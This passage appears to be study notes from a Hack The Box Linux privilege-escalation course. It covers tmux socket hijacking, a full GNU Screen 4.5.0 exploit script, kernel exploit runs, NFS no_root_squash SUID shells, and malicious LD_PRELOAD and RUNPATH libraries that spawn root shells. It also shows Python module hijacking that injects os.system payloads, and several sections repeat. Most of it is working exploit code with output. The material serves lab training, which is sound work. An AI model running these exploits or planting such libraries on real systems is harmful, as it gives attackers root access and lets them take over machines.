htb@NIX02:/tmp$ ls -la
-rwsr-xr-x 1 root root 16712 Sep 1 06:15 shell

htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Hijacking Tmux Sessions

Terminal multiplexers like tmux allow multiple terminal sessions to be accessed within a single console session. A user may detach from a tmux session and leave it running — for example while a long nmap scan completes. If a privileged user such as root has left a tmux session running with weak socket permissions, any user who can access that socket can attach to the session and inherit all of its privileges. A shared tmux session is created by specifying a custom socket path with -S. If the socket file is owned by root but has group read-write permissions set for a group your user belongs to, you can attach to the root tmux session and get a root shell by simply running tmux -S <socket_path>.

```bash
$ ps aux | grep tmux
root  4806  0.0  0.1  29416  3204 ?  Ss  06:27  0:00 tmux -S /shareds new -s debugsess

$ ls -la /shareds
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds

$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

$ tmux -S /shareds

id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Vulnerable Services — Screen 4.5.0

Many services found on Linux systems have publicly known vulnerabilities that can be leveraged for privilege escalation. GNU Screen version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file. Because Screen is often installed as SUID root to manage terminal sessions, this vulnerability allows an attacker to truncate any file or create a file owned by root in any directory, which is then leveraged through the ld.so.preload mechanism to load a malicious shared library and gain a root shell. The first step is to identify the installed Screen version — if it is 4.05.00, a pre-built exploit script is directly applicable.

```bash
$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

### Screen 4.5.0 — Exploit Script

The exploit script automates the full attack chain: it compiles a malicious shared library (libhax.so) that sets SUID on a root shell binary when loaded, compiles the root shell binary (rootshell), uses Screen''s log file vulnerability to write the library path into /etc/ld.so.preload, and then triggers Screen to load the library. The __attribute__((__constructor__)) annotation on the dropshell function causes it to run automatically when the library is loaded, setting SUID on the rootshell binary. Once triggered, running /tmp/rootshell gives an immediate root shell.

```bash
$ ./screen_exploit.sh

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),1000(mrb3n)
```

The full exploit script (Screen_Exploit_POC.sh):

```bash
#!/bin/bash
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
echo "[+] Triggering..."
screen -ls
/tmp/rootshell
```

---

## Kernel Exploits

Kernel-level exploits target vulnerabilities in the Linux kernel itself to execute code with root privileges regardless of any user-level permission controls. These are among the most powerful privilege escalation techniques because they bypass all software-level security controls — SUID restrictions, sudo rules, AppArmor, SELinux. A very well-known example is Dirty COW (CVE-2016-5195) which affected kernels from 2.x through 4.8.x. It is common to find systems vulnerable to kernel exploits, particularly legacy systems that are excluded from patching due to compatibility requirements with specific services or applications. The attack process is straightforward: identify the kernel version, search for a public exploit for that version, download, compile, and execute it. Always check kernel exploits in a test environment first as they can cause system instability or crashes on production systems.

### Kernel Exploit — Identification and Execution

The first step is to precisely identify the kernel version and Linux distribution. The uname -a command gives the full kernel version string and cat /etc/lsb-release gives the distribution and release version. These two pieces of information together allow you to search Google or exploit-db for applicable kernel exploit PoCs. Once you find a matching exploit, download the C source code to the target system, compile it with gcc, make it executable, and run it. Well-written kernel exploits drop you into a root shell automatically. Be aware that some exploits require modification for specific kernel sub-versions — always read the exploit source or README before running it.

```bash
$ uname -a
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 GNU/Linux

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

Search Google for: linux 4.4.0-116-generic exploit and download the applicable PoC.

```bash
$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

$ ./kernel_exploit
task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell

root@htb[/htb]# whoami
root
```

---

## Shared Libraries

Linux programs commonly use dynamically linked shared object libraries — files with the .so extension — which contain compiled code shared across multiple programs to avoid code duplication. When a program runs, the dynamic linker resolves and loads the required shared libraries before execution begins. The system searches for shared libraries in a specific order: paths compiled into the binary with -rpath, paths in the LD_LIBRARY_PATH environment variable, the default directories /lib and /usr/lib, and paths listed in /etc/ld.so.conf. Understanding this search order is critical for shared library privilege escalation because if any directory in the search path is writable by you and comes before the legitimate library''s directory, you can place a malicious library there that will be loaded instead. The ldd utility shows all shared libraries required by a binary along with their resolved paths.

```bash
$ ldd /bin/ls

linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
```

### LD_PRELOAD Privilege Escalation

The LD_PRELOAD environment variable tells the dynamic linker to load a specified shared library before any others when executing a binary. Functions defined in the preloaded library override the default implementations in standard libraries. This becomes exploitable for privilege escalation when sudo -l output shows env_keep+=LD_PRELOAD in the sudoers defaults — this means sudo preserves the LD_PRELOAD variable from the calling environment. Even if the only sudo-allowed command is something benign like apache2 restart, you can set LD_PRELOAD to point to a malicious shared library containing an _init() function that spawns a root shell, and that library will be loaded when sudo executes the allowed command.

```bash
$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass,
    secure_path=...,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Compile the malicious shared library:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
$ gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles

$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Shared Object Hijacking

Shared object hijacking targets SUID binaries that load non-standard shared libraries from directories with misconfigured write permissions. Unlike the standard library search path, some binaries have a RUNPATH compiled directly into them using the -rpath linker flag. The RUNPATH tells the dynamic linker to look in a specific directory for libraries before searching the default system paths. If that directory is world-writable, you can place a malicious shared library there that will be loaded instead of the legitimate one. The attack starts with identifying SUID binaries, running ldd to see their library dependencies, using readelf to check if a RUNPATH is set, verifying the RUNPATH directory is writable, then compiling a malicious library that implements the expected function.

### Shared Object Hijacking — Step by Step

**Step 1** — Identify the SUID binary and check its library dependencies with ldd:

```bash
$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll

$ ldd payroll
linux-vdso.so.1 (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
```

**Step 2** — Check the RUNPATH with readelf to confirm the library is loaded from a specific directory:

```bash
$ readelf -d payroll | grep PATH
0x000000000000001d (RUNPATH) Library runpath: [/development]
```

**Step 3** — Confirm the RUNPATH directory is writable:

```bash
$ ls -la /development/
drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./
```

**Step 4** — Run the binary to identify what function it expects from the library:

```bash
$ ./payroll
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

**Step 5** — Compile a malicious shared library implementing the expected dbquery function:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
$ gcc src.c -fPIC -shared -o /development/libshared.so

$ ./payroll

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

---

## Python Library Hijacking

Python library hijacking is a privilege escalation technique that exploits misconfigured write permissions on Python modules, misconfigured Python library search paths, or the ability to set the PYTHONPATH environment variable when running Python scripts with sudo. The attack relies on the fact that when a Python script imports a module, Python searches for that module through an ordered list of directories and imports the first match it finds. If you can place a malicious file named the same as an imported module in a directory that Python searches before the legitimate module''s directory, Python will import your malicious version instead. The key condition that makes this exploitable is that the script must be executed with elevated privileges via sudo, so that your injected code runs as root. There are three primary attack vectors: write permissions on the module file itself, write permissions on a higher-priority directory in the Python search path, and control over the PYTHONPATH environment variable.

### Python Library Hijacking — Checking Sudo Privileges

The first step is always sudo -l to understand exactly what Python scripts you can run as root and what environment variable handling is in place. The output shows the exact path to the Python binary and the script it is allowed to run. Also check the SETENV flag — if present, it means you are allowed to set environment variables including PYTHONPATH when running the sudo command, which is itself a complete privilege escalation path. Look at the script path and note that even if you cannot write to the script directly, you may be able to exploit the modules it imports.

```bash
$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=...

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

### Python Library Hijacking — Reading the Target Script

After identifying the allowed Python script, read its contents to understand what modules it imports. The module names are your primary targets for hijacking. In the example below the script imports psutil and calls psutil.virtual_memory(). Knowing the exact module name and the exact function called within it is critical because your malicious replacement module must implement a function with exactly the same name and the same number of parameters or the script will error out and your payload will not execute. Always note the import statement exactly as written.

```bash
$ cat mem_status.py

#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

### Python Library Hijacking — Insecure Write Permissions on Module

If the module file itself has world-writable or group-writable permissions, you can directly insert malicious code into it. Use grep -r to find which file within the module directory contains the target function definition, then check that file''s permissions with ls -l. If the permissions show -rw-r--rw- or similar world-writable permissions, you can edit the module file and inject your payload at the beginning of the target function. Insert it right at the top of the function body so it executes before the rest of the function. After injecting a test command like os.system(''id''), run the script with sudo to confirm execution as root, then replace the test with your real payload.

```bash
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Inject payload into the module function:

```python
def virtual_memory():
    #### Hijacking
    import os
    os.system(''id'')
    ####

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
```

```bash
$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

### Python Library Hijacking — Library Search Path Hijacking

Python searches for modules in a specific priority order defined by sys.path. Directories listed higher in the list are searched before directories listed lower. If the legitimate module is installed in a lower-priority directory, and you have write access to a higher-priority directory, you can place a malicious file named after the module in the writable higher-priority directory. Python will find and import yours first without ever reaching the legitimate module. Check the full search path with python3 -c ''import sys; print("\n".join(sys.path))'', then check write permissions on each directory, and find where the target module is installed with pip3 show <module>.

```bash
$ python3 -c ''import sys; print("\n".join(sys.path))''

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages

$ ls -la /usr/lib/python3.8
drwxr-xrwx 30 root root 20480 Dec 14 16:26 .
```

/usr/lib/python3.8 is world-writable and higher priority than /usr/local/lib/python3.8/dist-packages where psutil is installed. Create a fake psutil.py there:

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system(''id'')
```

```bash
$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  AttributeError: ''NoneType'' object has no attribute ''available''
```

Code executed as root — the traceback is expected because our fake module does not return a real memory object, but the payload ran successfully.

### Python Library Hijacking — PYTHONPATH Environment Variable

PYTHONPATH is an environment variable that specifies additional directories Python should search for modules before the standard sys.path directories. If sudo -l shows the SETENV flag alongside a Python binary in the allowed commands, you are permitted to set environment variables including PYTHONPATH when running the sudo command. This allows you to point Python at any directory you control — for example /tmp/ — and place your malicious module file there. When sudo runs the Python script with your custom PYTHONPATH, Python looks in /tmp/ first, finds your malicious module, and imports it, executing your payload as root regardless of where the legitimate module is installed.

```bash
$ sudo -l

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Place the malicious psutil.py in /tmp/:

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system(''id'')
```

```bash
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Python searched /tmp/ first due to PYTHONPATH, found our malicious psutil.py, imported it, and executed our os.system(''id'') call as root before the script''s normal output was produced.

---

# Part 4: NFS, Tmux, Kernel Exploits, LD_PRELOAD, Shared Object Hijacking, Python Library Hijacking, Sudo CVEs, Netfilter, Polkit, Dirty Pipe

---

## NFS Weak Permissions

NFS (Network File System) shares files and directories over the network via TCP/UDP port 2049, allowing remote systems to access them as if they were local. The critical misconfiguration that enables privilege escalation is the no_root_squash option in /etc/exports on the server side. When this option is set, any remote user connecting to the NFS share as root retains root privileges on the share — they are not demoted to the nfsnobody unprivileged account as they would be with the default root_squash behaviour. This means you can mount the NFS share from your attacker machine as root, write a SUID binary to it, set the SUID bit, and then execute it on the target system to get a root shell. A critical practical consideration is glibc version mismatch — binaries compiled on a newer system will fail on older targets with errors like GLIBC_2.34 not found. Always compile directly on the target system or use static linking to avoid this problem entirely.

### NFS — Enumeration

The first step is to remotely list what NFS exports are available on the target system. The showmount -e command queries the NFS server and returns all exported directories along with who is permitted to mount them. After identifying available shares, check the server-side NFS configuration at /etc/exports on the target to see which options are set — specifically look for no_root_squash. Also check /proc/mounts on the target to see currently active NFS mounts and whether the nosuid option is enforced, because nosuid on a mounted filesystem would prevent SUID binaries from executing with elevated privileges even if you manage to write them there.

```bash
$ showmount -e 10.129.2.210
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *

$ cat /etc/exports
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)

$ cat /proc/mounts | grep nfs
```

### NFS — Exploitation via SUID Binary

Once you confirm no_root_squash is set, the exploitation process involves compiling a SUID shell binary. The safest approach is to compile it directly on the target to match the target''s glibc version. The C code simply calls setuid(0) and setgid(0) to set root privileges then spawns /bin/bash. On your attacker machine mount the NFS share as root, copy the compiled binary into the mounted share, set root ownership and the SUID bit. Then return to the target and execute the binary — because the NFS export has no_root_squash the SUID bit was written by your root user and is honoured on the target, dropping you into a root shell.

```bash
# On TARGET — compile shell binary matching target glibc
cat > /tmp/shell.c << ''EOF''
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc /tmp/shell.c -o /tmp/shell_local

# On ATTACKER (as root) — mount share, copy binary, set SUID
sudo mount -t nfs 10.129.2.210:/tmp /mnt
cp /tmp/shell_local /mnt/shell_root
chown root:root /mnt/shell_root
chmod 4755 /mnt/shell_root

# Back on TARGET — execute SUID binary
/tmp/shell_root
id
uid=0(root) gid=0(root) groups=0(root)
```

### NFS — Reading Flags Directly

Before attempting complex exploitation, always check whether NFS exports are world-readable and whether sensitive files like flags are directly accessible. Many NFS exports are configured with permissive read permissions so that multiple systems can read from them. If you can list the exported directory and read files directly as your current low-privileged user, there is no need for SUID exploitation at all for simple file reading. Always try the simplest approach first.

```bash
$ ls -la /var/nfs/general/
$ cat /var/nfs/general/exports_flag.txt
```

---

## Tmux Session Hijacking

Tmux is a terminal multiplexer that allows multiple terminal sessions to persist and be accessed within a single console session. A privileged user like root may start a tmux session, detach from it while it continues running in the background (for example while monitoring a long process), and attach the session socket to a group-writable path for convenience. If your current user belongs to the group that has write permissions on that socket file, you can attach directly to the privileged user''s running tmux session and inherit all of their privileges without any exploit. The attack is entirely based on misconfigured socket file permissions and requires no vulnerability in tmux itself — it is a pure configuration error. This technique is particularly effective because it is silent, leaves minimal forensic trace, and gives you a fully interactive shell as the privileged user.

### Tmux — Enumeration

Enumerate running tmux processes to find any sessions started by privileged users. The ps aux | grep tmux command shows all running tmux processes including the user that started them (UID column) and the socket path specified with the -S flag. Once you identify a socket path, check its file permissions with ls -la. A socket owned by root but with group read-write permissions is exploitable if your user belongs to that group. Always confirm your current group memberships with id and cross-reference against the socket file''s group ownership.

```bash
$ ps aux | grep tmux
root  4806  0.0  0.1  29416  3204 ?  Ss  06:27  0:00 tmux -S /shareds new -s debugsess

$ ls -la /shareds
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds

$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Your user is in the devs group and the socket is group-writable for devs — exploitation is possible.

### Tmux — Exploitation

Attaching to the privileged tmux session requires only one command — tmux -S <socket_path>. This tells tmux to connect to the session via the specified socket rather than the default socket location. Because the socket has group-write permissions and your user is in the correct group, tmux allows the attachment. You are immediately dropped into the root user''s running terminal session with full root privileges. Always verify with id immediately after attaching and read the flag before doing anything else that might disturb the session.

```bash
$ tmux -S /shareds

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

---

## Kernel Exploit — CVE-2021-3493 (OverlayFS Ubuntu)

Kernel exploits target vulnerabilities in the Linux kernel itself, bypassing all user-space security controls including sudo rules, AppArmor, SELinux, and SUID restrictions. CVE-2021-3493 abuses the way the Linux kernel handles file capabilities in OverlayFS on Ubuntu systems. OverlayFS is a union filesystem used extensively in containers. The vulnerability allows an unprivileged user to execute a binary with elevated capabilities via a specially constructed OverlayFS mount. It affects kernels before specific patch levels on Ubuntu 18.04 and 20.04. The target kernel 4.15.0-76-generic on Ubuntu 18.04 is confirmed vulnerable. A critical operational point is that kernel exploits must be compiled directly on the target system whenever possible — transferring pre-compiled binaries from newer systems causes glibc version errors that prevent execution.

### CVE-2021-3493 — Enumeration and Exploitation

The first step is always to identify the exact kernel version and OS release. The combination of the kernel version string from uname -a and the distribution from /etc/lsb-release tells you precisely which CVEs apply. Once confirmed, transfer the exploit source code to the target, compile it there, make it executable, and run it. A working kernel exploit drops you directly into a root shell. Always read the exploit README or source comments before running to understand what the exploit does and whether it poses any stability risk to the system.

```bash
$ uname -a
Linux NIX02 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic

# Transfer exploit source to target
$ scp exploit.c htb-student@10.129.2.210:/tmp/

# On TARGET — compile and execute
$ cd /tmp
$ gcc exploit.c -o exploit
$ chmod +x exploit
$ ./exploit

id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/kernel_exploit/flag.txt
```

---

## LD_PRELOAD Privilege Escalation

LD_PRELOAD is an environment variable that instructs the dynamic linker to load a specified shared library before all other libraries when any program starts. Functions defined in the preloaded library override the default implementations in standard libraries because they are found first in the loading order. This becomes a privilege escalation vector when sudo -l shows env_keep+=LD_PRELOAD in the sudoers Defaults section — this means sudo explicitly preserves the LD_PRELOAD variable from the calling environment instead of resetting it. The attack works by compiling a malicious shared library whose _init() constructor function calls setuid(0) to gain root privileges and then spawns /bin/bash. When any sudo-allowed command is executed with LD_PRELOAD pointing to your malicious library, the library is loaded first as root and _init() fires before the real program even starts. The actual sudo-allowed command being run (apache2, openssl, etc.) is completely irrelevant — it is simply the vehicle that triggers the library load.

### LD_PRELOAD — Enumeration

The key thing to look for in sudo -l output is the env_keep+=LD_PRELOAD entry in the Defaults section. This setting is a security misconfiguration that survives the sudo call and makes the attack possible. Also enumerate other user accounts on the system because the user with this misconfigured sudo rule may not be your current user — you may need to pivot to another account first. Try password reuse across discovered user accounts with su <username> using passwords already found during enumeration. Once on the account with env_keep+=LD_PRELOAD configured, the attack becomes straightforward.

```bash
$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

$ cat /etc/passwd | grep -v "nologin\|false"

$ su daniel.carter
```

### LD_PRELOAD — Exploitation

Write the malicious shared library source code in C. The _init() function is automatically called when a shared library is loaded, making it the perfect injection point. It first calls unsetenv("LD_PRELOAD") to clean itself up and avoid recursive loading, then calls setgid(0) and setuid(0) to set root credentials, and finally spawns /bin/bash which inherits the root privileges. Compile it with -fPIC (position independent code, required for shared libraries), -shared (output a shared library), and -nostartfiles (exclude standard startup files which conflict with _init()). Then trigger it by running any sudo-allowed command with LD_PRELOAD set to the full path of your compiled library.

```bash
$ cat > /tmp/root.c << ''EOF''
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

$ gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/ld_preload/flag.txt
```

---

## Shared Object Hijacking

Shared object hijacking targets SUID binaries that load non-standard shared libraries from custom directories defined in their compiled-in RUNPATH. The RUNPATH is a directory path embedded directly into the binary at compile time using the -rpath linker flag, which tells the dynamic linker to search that directory for libraries before searching the standard system paths. If that RUNPATH directory is world-writable, you can place a malicious shared library there with the same filename as the library the binary expects. When the SUID binary runs as root and tries to load the library, it finds and loads your malicious version instead, executing your code with root privileges. The complete attack chain involves identifying the SUID binary, using ldd to find its library dependencies and readelf to confirm the RUNPATH, verifying the RUNPATH directory is writable, discovering what function name the binary expects from the library, implementing that function in a malicious library, and placing it in the writable RUNPATH directory.

### Shared Object Hijacking — Enumeration

Start by finding all SUID binaries on the system. Then for each interesting one run ldd to see what shared libraries it loads and from where. A library being loaded from a non-standard path like /development/ or /opt/ is immediately suspicious. Confirm the RUNPATH is intentionally set using readelf -d and look for the RUNPATH tag. Then check whether the RUNPATH directory is writable by your current user. A drwxrwxrwx permission on the RUNPATH directory is the green light for this attack.

```bash
$ find / -perm -4000 2>/dev/null
$ ls -la /home/mrb3n/payroll
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll

$ ldd payroll
linux-vdso.so.1 (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)

$ readelf -d payroll | grep PATH
0x000000000000001d (RUNPATH) Library runpath: [/development]

$ ls -la /development/
drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./
```

### Shared Object Hijacking — Discovering the Required Function Name

Before compiling your malicious library you need to know the exact function name that the SUID binary expects to find in the shared library. If you compile a library without implementing the right function, the binary will fail with an undefined symbol error. You can intentionally trigger this error by copying a legitimate standard library to the RUNPATH directory under the expected library name — when the binary loads it and tries to call the missing function, the error message tells you exactly what function name you need to implement.

```bash
$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

$ ./payroll
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

The binary expects a function called dbquery — this is what your malicious library must implement.

### Shared Object Hijacking — Exploitation

Now compile a malicious shared library that implements the dbquery function. Inside that function call setuid(0) to set root user ID and then spawn /bin/sh -p with the -p flag which preserves the effective UID set by setuid. Place the compiled library directly into the writable RUNPATH directory under the exact filename that ldd showed the binary expects. Then execute the SUID binary — it loads your library as root, calls dbquery(), your code executes, and you get a root shell.

```bash
$ cat > /tmp/src.c << ''EOF''
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF

$ gcc /tmp/src.c -fPIC -shared -o /development/libshared.so

$ ./payroll

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)

$ cat /root/shared_obj_hijack/flag.txt
```

---

## Python Library Hijacking

Python library hijacking is a privilege escalation technique that exploits misconfigurations in how Python resolves and imports modules when a script is executed with elevated privileges via sudo. When Python imports a module it searches through an ordered list of directories defined in sys.path and imports the first matching file it finds. Three distinct attack vectors exist depending on what is misconfigured. Vector 1 targets the module file itself being world-writable, allowing direct code injection. Vector 2 targets a higher-priority directory in sys.path being writable, allowing you to shadow the legitimate module with a fake one. Vector 3 targets the SETENV flag in sudoers being set, allowing you to specify PYTHONPATH=/tmp to redirect Python''s module search entirely. All three require the script to be executed via sudo so that your injected code runs as root. The key enumeration steps are checking sudo -l, reading the target script to identify imported modules, finding where those modules are installed, checking write permissions on the module file and on higher-priority sys.path directories, and checking for the SETENV flag.

### Python Library Hijacking — Enumeration

```bash
$ sudo -l

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

$ cat ~/mem_status.py
#!/usr/bin/env python3
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")

$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 __init__.py

$ python3 -c ''import sys; print("\n".join(sys.path))''
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

$ ls -la /usr/lib/python3.8
drwxr-xrwx 30 root root 20480 Dec 14 16:26 .

$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages
```

### Python Library Hijacking — Vector 1: Direct Module File Injection

When the module file itself has world-writable permissions (-rw-r--rw-), you can inject code directly into the target function inside the module. The injected code runs every time that function is called. Insert your payload right at the start of the target function body so it executes before the function''s normal code. Use a Python script to safely inject lines after the function definition line to avoid corrupting the file syntax. After injecting a test payload like os.system(''id''), run the script with sudo to confirm root execution, then replace the test with your actual payload such as copying the root flag to a readable location.

```python
$ python3 << ''EOF''
with open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'', ''r'') as f:
    lines = f.readlines()

new_lines = []
for i, line in enumerate(lines):
    new_lines.append(line)
    if ''def virtual_memory():'' in line:
        new_lines.append(''    import os\n'')
        new_lines.append(''    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")\n'')

with open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'', ''w'') as f:
    f.writelines(new_lines)
EOF

$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
```

### Python Library Hijacking — Vector 2: Search Path Hijacking

When a higher-priority directory in sys.path is world-writable and the target module is installed in a lower-priority directory, you can create a fake module file in the writable higher-priority directory. Python finds and imports your file first because it searches sys.path from top to bottom. The fake module must implement a function with exactly the same name as the function called in the target script, and it must return something of the correct type so the script does not immediately crash after your payload runs. Use a Dummy class with the required attributes to satisfy the calling script''s expectations while still executing your payload.

```python
$ cat > /usr/lib/python3.8/psutil.py << ''EOF''
import os

def virtual_memory():
    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")
    class Dummy:
        available = 1
        total = 1
    return Dummy()
EOF

$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
```

### Python Library Hijacking — Vector 3: PYTHONPATH Environment Variable Hijacking

When sudo -l shows SETENV: NOPASSWD: /usr/bin/python3 in the allowed commands, you are permitted to set environment variables when running Python via sudo. Setting PYTHONPATH=/tmp before the sudo command makes Python search /tmp first for any module being imported. Create a fake psutil.py in /tmp with your payload function, then run the sudo command with PYTHONPATH=/tmp prepended. Python finds your fake module in /tmp before reaching the legitimate installation in /usr/local/lib/python3.8/dist-packages/, imports it, and executes your code as root.

```python
$ cat > /tmp/psutil.py << ''EOF''
import os

def virtual_memory():
    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")
    class Dummy:
        available = 1
        total = 1
    return Dummy()
EOF

$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
